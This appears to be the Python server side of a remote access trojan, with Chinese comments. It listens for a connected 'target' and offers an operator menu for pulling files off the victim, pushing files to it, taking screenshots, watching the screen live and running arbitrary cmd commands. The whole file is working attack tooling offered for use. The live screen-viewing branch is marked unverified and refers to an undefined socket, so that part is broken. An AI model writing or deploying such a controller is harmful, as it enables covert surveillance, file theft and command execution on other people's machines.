
import socket
import os,time,struct
#from pynput.keyboard import Key, Controller,Listener
ip = "" 
port = 6369  # 设置端口
from threading import Thread
print('''
@recv xx.xx     下载文件
@upload xx.xx   上传文件
@screenshots     截屏
@see            窥屏
$xx             执行cmd命令
''')
while 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(10)
    conn, addr = s.accept()
    print("新的连接：",addr)
    while True:
        try:
            recv_data=str((conn.recv(1024)),encoding="gbk")
            if recv_data=="ojbk":print("命令执行完毕")
            else:print("[target]:",recv_data)
            data=input("command:")
            cmdline=data.split(" ",1)
            conn.send(bytes(data, encoding="gbk"))
            if cmdline[0]=="@recv":
                    recv_file=os.path.basename(data.replace("@recv ",""))
                    print("recv file<----"+recv_file)
                    conn.send(bytes("ok", encoding="gbk"))
                    
                    recvd_size = 0 
                    fp = open(r"./"+recv_file+".bak", 'ab')#ab追加 wb覆盖
                    file_size=int(conn.recv(1024))
                    print("recv size:",file_size)
                    while not recvd_size == file_size:
                        if file_size - recvd_size > 1024:
                            data = conn.recv(1024)
                            recvd_size += len(data)
                        else:
                            data = conn.recv(file_size - recvd_size)
                            recvd_size = file_size
                            print(data)
                            fp.write(data)
                    fp.close()
                    conn.send(bytes("success", encoding="gbk"))
                    conn.send(bytes("ojbk", encoding="gbk"))
            elif  cmdline[0]=="@upload":
                    send_file=data.replace("@upload ","")
                    print("you try upload file--->"+send_file)
                    if os.path.isfile(send_file):
                                # 定义文件头信息，包含文件名和文件大小
                                #fhead_msg = struct.pack(str(len(send_file))+"s", os.path.basename(send_file).encode("utf-8"))
                        redat=conn.recv(1024)
                        print(redat)
                        if redat==b'ok':
                            print("start send")
                            file_quality=str(os.stat(send_file).st_size).encode("gbk")
                            print(file_quality)
                            conn.send(file_quality)
                            fp = open(send_file, 'rb')
                            while 1:
                                data = fp.read(1024)
                                if not data and conn.recv(1024)==b'success':
                                    print("send succes")
                                    fp.close()
                                    break
                                conn.send(data)
                            
                        else:
                            print("target return other message")
            elif cmdline[0]=="@see":#未验证
                import matplotlib.pyplot as plt
                import matplotlib.image as image
                from io import BytesIO
                plt.clf()  # 清除上一幅图像
                data, addr = sock.recvfrom(65536)  # 接受数值大一点，防止被撑爆
                img = BytesIO(data)
                img = image.imread(img, format='jpeg')
                plt.imshow(img)
                plt.pause(0.05)  # 暂停0.05秒 这一句是实现动态更新的
                plt.ioff()  # 关闭画图的窗口


        except :

            time.sleep(1)
            conn.close() 
            s.close()
            break
        time.sleep(1)
    time.sleep(3)

